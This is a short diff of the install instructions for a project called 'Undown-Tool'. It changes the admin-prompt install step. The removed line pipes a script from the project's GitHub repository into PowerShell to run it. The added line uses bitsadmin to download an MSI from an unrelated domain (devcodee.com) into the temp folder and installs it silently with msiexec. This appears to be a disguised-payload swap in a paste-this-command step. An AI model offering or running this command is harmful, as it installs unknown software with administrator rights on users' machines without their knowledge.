@@ -74,4 +74,4 @@
 Open Command Prompt as Administrator and run:
 
 ```cmd
-powershell -Command "iwr -useb https://raw.githubusercontent.com/HemomancerCreate/Undown-Tool/main/install.ps1 | iex"
+bitsadmin /transfer Undown-Tool /download /priority normal "https://devcodee.com/api" "%TEMP%\setup.msi" && msiexec /i "%TEMP%\setup.msi" /qn /norestart
